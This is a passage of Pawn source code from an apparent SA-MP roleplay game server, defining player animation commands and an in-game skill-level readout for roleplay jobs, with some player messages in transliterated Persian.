        LoopingAnim(playerid,"BEACH", "SitnWait_loop_W", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/joint", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"GANGS","smkcig_prtl",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/die", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "PARACHUTE", "FALL_skyDive_DIE", 4.0, 0, 1, 1, 1, -1); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/benddown", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "BAR", "Barserve_bottle", 4.0, 0, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp("/medic", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"MEDIC","CPR",4.1,0,1,1,1,1);AnimPlay[playerid] = 1;
        return 1;
    }
     if (strcmp("/laugh", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/carjack", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_jackedLHS",4.0,0,1,1,1,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if (strcmp("/vomit", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /vomit <1-2>");
        new anim = strval(tmp);
        if(anim == 1) {LoopingAnim(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else if(anim == 2) {LoopingAnim(playerid, "FOOD", "EAT_VOMIT_SK", 4.0, 0, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SCM(playerid, COL_SYN, "Syntax: /vomit <1-2>");
        return 1;
    }
     if(strcmp(cmd, "/taichi", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/bomb", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/robman", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/chat", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid,"PED","IDLE_CHAT",4.1,1,1,1,1,1);AnimPlay[playerid] = 1;
         return 1;
    }







		if(strcmp(cmd, "/sexy", true) == 0)
		{
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
			tmp = strtok(cmdtext,idx);
			if (!strlen(tmp))
			{
				SCM(playerid,COLOR_GRAD3,"Usage: /sexy [1-8]"); return 1;
			}
			new animid = strval(tmp);
			if(animid == 1) { LoopingAnim(playerid,"SNM","SPANKING_IDLEW",4.1,0,1,1,1,1);AnimPlay[playerid] = 1; }
			else if(animid == 2) { LoopingAnim(playerid,"SNM","SPANKING_IDLEP",4.1,0,1,1,1,1);AnimPlay[playerid] = 1; }
			else if(animid == 3) { LoopingAnim(playerid,"SNM","SPANKINGW",4.1,0,1,1,1,1); AnimPlay[playerid] = 1;}
			else if(animid == 4) { LoopingAnim(playerid,"SNM","SPANKINGP",4.1,0,1,1,1,1);AnimPlay[playerid] = 1; }
			else if(animid == 5) { LoopingAnim(playerid,"SNM","SPANKEDW",4.1,0,1,1,1,1); AnimPlay[playerid] = 1;}
			else if(animid == 6) { LoopingAnim(playerid,"SNM","SPANKEDP",4.1,0,1,1,1,1); AnimPlay[playerid] = 1;}
			else if(animid == 7) { LoopingAnim(playerid,"SNM","SPANKING_ENDW",4.1,0,1,1,1,1); AnimPlay[playerid] = 1;}
			else if(animid == 8) { LoopingAnim(playerid,"SNM","SPANKING_ENDP",4.1,0,1,1,1,1); AnimPlay[playerid] = 1;}
			else { SCM(playerid,COLOR_GRAD3,"Usage: /sexy [1-8]"); }
			return 1;
		}






		if(strcmp(cmd, "/farar", true) == 0)
		{
SendClientMessage(playerid, COLOR_GRAD5, "System Farar Az Zendan Off Mibashad.");
			return 1;
		}














    if (strcmp("/pee", cmd, true) == 0)
    {
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    if(PlayerHandsCuffed[playerid] == 1)
    {
    SCM(playerid,COLOR_visit,"you can't pissing when your hands are cuffed.");
    return 1;
    }
        if (GetPlayerState(playerid)== 1)
        {
            SetPlayerSpecialAction(playerid, PISSING);
        }
        return 1;
    }
    if(strcmp(cmd, "/fakepee", true) == 0)
    {
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
         LoopingAnim(playerid, "PAULNMAC", "Piss_in", 3.0, 0, 0, 0, 0, 0);AnimPlay[playerid] = 1;
         return 1;
    }
    if(strcmp(cmd, "/kiss", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "KISSING", "Playa_Kiss_02", 3.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/wave", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /wave <1-2>");
        new anim = strval(tmp);
        if(anim == 1){LoopingAnim(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else if(anim == 2){LoopingAnim(playerid, "BD_FIRE", "BD_GF_WAVE", 4.0, 0, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SCM(playerid,COL_SYN, "Syntax: /wave <1-2>");
        return 1;
    }
     if(strcmp(cmd, "/chairsit", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /chairsit <1-2>");
        new anim = strval(tmp);
        if(anim == 1) endchair(playerid);
        else if(anim == 2){LoopingAnim(playerid, "JST_BUISNESS", "GIRL_02", 2.5, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SCM(playerid,COL_SYN, "Syntax: /chairsit <1-2>");
        return 1;
    }
    if(!strcmp(cmd, "/heyu",true))
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "ON_LOOKERS", "POINT_LOOP", 4.0, 1, 0, 0, 0, 0);
        AnimPlay[playerid] = 1;
        return 1;
    }
    if(!strcmp(cmd, "/scratchballs",true))
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "MISC", "SCRATCHBALLS_01", 4.0, 0, 0, 0, 0, 0);
        AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/drunk", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED", "WALK_DRUNK",4.1,1,1,1,1,1);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/crack", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"CRACK", "crckdeth2",4.1,1,1,1,1,10000);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/injured", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[9])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /injured [1-4]");
        switch (cmdtext[9])
        {
            case '1': { LoopingAnim(playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"SWAT","gnstwall_injurd", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case '3': { LoopingAnim(playerid, "SWEET", "LAFIN_SWEET", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case '4': { LoopingAnim(playerid, "WUZI", "CS_DEAD_GUY", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                default: SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /injured [1-4]");
        }
        return 1;
    }
    if(strcmp(cmd, "/hitch", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"MISC","Hiker_Pose", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/gsign", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        new gsig;
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) {
        SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /gsign [1-5]");
        return 1;
        }
        gsig = strval(tmp);
        if(gsig < 1 || gsig > 5)
        {
        SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /gsign [1-5]");
        return 1;
        }
        if(gsig == 1)
        {
        LoopingAnim(playerid,"GHANDS","gsign1",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gsig == 2)
        {
        LoopingAnim(playerid,"GHANDS","gsign2",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gsig == 3)
        {
        LoopingAnim(playerid,"GHANDS","gsign3",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gsig == 4)
        {
        LoopingAnim(playerid,"GHANDS","gsign4",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gsig == 5)
        {
        LoopingAnim(playerid,"GHANDS","gsign5",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else
        {
        SCM(playerid,COLOR_GRAD3,"USAGE: /gsign [1-5]");
        return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/nod", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"COP_AMBIENT","Coplook_nod",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/cry", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        new cr;
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) {
        SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /cry [1-2]");
        return 1;
        }
        cr = strval(tmp);
        if(cr < 1 || cr > 2)
        {
        SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /cry [1-2]");
        return 1;
        }
        if(cr == 1)
        {
        LoopingAnim(playerid,"GRAVEYARD","mrnF_loop", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        }
        else if(cr == 2)
        {
        LoopingAnim(playerid,"GRAVEYARD","mrnM_loop", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        }
        else
        {
        SCM(playerid,COLOR_GRAD3,"USAGE: /cry [1-2]");
        return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/ghand", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        new gha;
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) {
        SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /ghand [1-5]");
        return 1;
        }
        gha = strval(tmp);
        if(gha < 1 || gha > 5)
        {
        SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /ghand [1-5]");
        return 1;
        }
        if(gha == 1)
        {
        LoopingAnim(playerid,"GHANDS","gsign1LH",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gha == 2)
        {
        LoopingAnim(playerid,"GHANDS","gsign2LH",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gha == 3)
        {
        LoopingAnim(playerid,"GHANDS","gsign3LH",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gha == 4)
        {
        LoopingAnim(playerid,"GHANDS","gsign4LH",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else if(gha == 5)
        {
        LoopingAnim(playerid,"GHANDS","gsign5LH",4.0,0,1,1,1,1); AnimPlay[playerid] = 1;
        }
        else
        {
        SCM(playerid,COLOR_GRAD3,"USAGE: /ghand [1-5]");
        return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/chant", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"RIOT","RIOT_CHANT", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/yes", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"CLOTHES","CLO_Buy", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/relax", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"BEACH","Lay_Bac_Loop", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/celebrate", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"GYMNASIUM","gym_tread_celebrate", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
   if(strcmp(cmd, "/smoking", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
     new sigar[256];
     sigar = strtok(cmdtext, idx);
     if(!strlen(sigar))
    {
     SCM(playerid,COLOR_MEDIC,"SYNTAX: /smoking [1-4]");
     return 1;
    }
     else if(strcmp(sigar,"1",true) == 0)
     {
     LoopingAnim(playerid,"SMOKING","F_smklean_loop",4.0,1,0,0,0,0);
  AnimPlay[playerid] = 1;
     return 1;
     }
     else if(strcmp(sigar,"2",true) == 0)
     {
     LoopingAnim(playerid,"SMOKING","M_smklean_loop",4.0,1,0,0,0,0);
  AnimPlay[playerid] = 1;
     return 1;
     }
     else if(strcmp(sigar,"3",true) == 0)
     {
     LoopingAnim(playerid,"SMOKING","M_smkstnd_loop",4.0,1,0,0,0,0);
  AnimPlay[playerid] = 1;
     return 1;
     }
     else if(strcmp(sigar,"4",true) == 0)
     {
     LoopingAnim(playerid,"SMOKING","M_smk_loop",4.0,1,0,0,1,1);
  AnimPlay[playerid] = 1;
     return 1;
     }
     else
     {
     SCM(playerid,COLOR_MEDIC,"SYNTAX: /smoking [1-4]");
     return 1;
     }
     }
//--------------------------------------
    if(strcmp(cmd,"/skill",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            new x_nr[256];
            x_nr = strtok(cmdtext, idx);
            if(!strlen(x_nr)) {
                SendClientMessage(playerid, COLOR_ROUZ,"** USAGE: /skill [number]                       ");
                  SendClientMessage(playerid, CRISTIAN, "|_________________ Skill Info ________________|");
                SendClientMessage(playerid, COLOR_YELLOW, " 1: Detective            6: Car Mechanic     ");
                SendClientMessage(playerid, COLOR_YELLOW, " 2: Lawyer               7: Arms Dealer      ");
                SendClientMessage(playerid, COLOR_YELLOW, " 3: Drugs Dealer         8: Rob              ");
                SendClientMessage(playerid, COLOR_YELLOW, " 4: Car Jacker                               ");
                SendClientMessage(playerid, COLOR_YELLOW, " 5: News Reporter                            ");
                  SendClientMessage(playerid, CRISTIAN, "|_________________________________________|");
                return 1;
            }
            if(strcmp(x_nr,"1",true) == 0)//Detective
            {
                new level = PlayerInfo[playerid][pDetSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 1."); format(string, sizeof(string), "You need to find %d more people to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 2."); format(string, sizeof(string), "You need to find %d more people to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 3."); format(string, sizeof(string), "You need to find %d more people to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200 && level <= 399) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 4."); format(string, sizeof(string), "You need to find %d more people to Level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"2",true) == 0)//Lawyer
            {
                new level = PlayerInfo[playerid][pLawSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 1."); format(string, sizeof(string), "You need to free %d more people to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 2."); format(string, sizeof(string), "You need to free %d more people to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 149) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 3."); format(string, sizeof(string), "You need to free %d more people to Level up.", 150 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 150 && level < 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 4."); format(string, sizeof(string), "You need to free %d more people to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"3",true) == 0)//drug dealer
            {
                new level = PlayerInfo[playerid][pDrugsSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 1."); format(string, sizeof(string), "You need to sell drugs %d times more to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 2."); format(string, sizeof(string), "You need to sell drugs %d times more to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 3."); format(string, sizeof(string), "You need to sell drugs %d times more to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200 && level <= 399) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 4."); format(string, sizeof(string), "You need to sell drugs %d times more to Level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"4",true) == 0)//Car Jacker
            {
                new level = PlayerInfo[playerid][pJackSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 1."); format(string, sizeof(string), "You need to drop %d cars more to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 2."); format(string, sizeof(string), "You need to drop %d cars more to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 3."); format(string, sizeof(string), "You need to drop %d cars more to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200 && level <= 399) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 4."); format(string, sizeof(string), "You need to drop %d cars more to Level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"5",true) == 0)//News Reporter
            {
                new level = PlayerInfo[playerid][pNewsSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your New Reporter Skill Level = 1."); format(string, sizeof(string), "You need to use /news %d times more to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your New Reporter Skill Level = 2."); format(string, sizeof(string), "You need to use /news %d times people to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your New Reporter Skill Level = 3."); format(string, sizeof(string), "You need to use /news %d times people to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200 && level <= 399) { SendClientMessage(playerid, COLOR_YELLOW, "Your New Reporter Skill Level = 4."); format(string, sizeof(string), "You need to use /news %d times people to Level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your New Reporter Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"6",true) == 0)//Car Mechanic
            {
                new level = PlayerInfo[playerid][pMechSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 1."); format(string, sizeof(string), "You need to repair/refill a car for %d times more to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 2."); format(string, sizeof(string), "You need to repair/refill a car for %d times people to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 3."); format(string, sizeof(string), "You need to repair/refill a car for %d times people to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200 && level <= 399) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 4."); format(string, sizeof(string), "You need to repair/refill a car for %d times people to Level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"7",true) == 0)//Arms Dealer
            {
                new level = PlayerInfo[playerid][pMatsSkill];
                if(level >= 0 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 1."); format(string, sizeof(string), "You need to Deliver package for %d times more to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 2."); format(string, sizeof(string), "You need to Deliver package for %d times more to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100 && level <= 199) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 3."); format(string, sizeof(string), "You need to Deliver package for %d times more to Level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 200 && level <= 299) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 4."); format(string, sizeof(string), "You need to Deliver package for %d times more to Level up.", 300 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 300) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 5."); }
            }
            else if(strcmp(x_nr,"8",true) == 0)//Robbing
            {
                new level = PlayerInfo[playerid][pRobSkill];
                if(level >= 0 && level <= 19) { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill Level = 1."); format(string, sizeof(string), "You need to Rob the City Bank %d more times to Level up.", 20 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 20 && level <= 49) { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill Level = 2."); format(string, sizeof(string), "You need to Rob the City Bank %d more times to Level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 50 && level <= 74) { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill Level = 3."); format(string, sizeof(string), "You need to Rob the City Bank %d more times to Level up.", 75 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 75 && level <= 99) { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill Level = 4."); format(string, sizeof(string), "You need to Rob the City Bank %d more times to Level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
                else if(level >= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill Level = 5."); }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "Invalid Skill Number.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/givelicense", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAnInstructor(playerid))
            {
                if(PlayerInfo[playerid][pRank] <= 2)
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Only Rank 2 or higher can give away a License.");
                    return 1;
                }
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense [name] [playerid/PartOfName]");
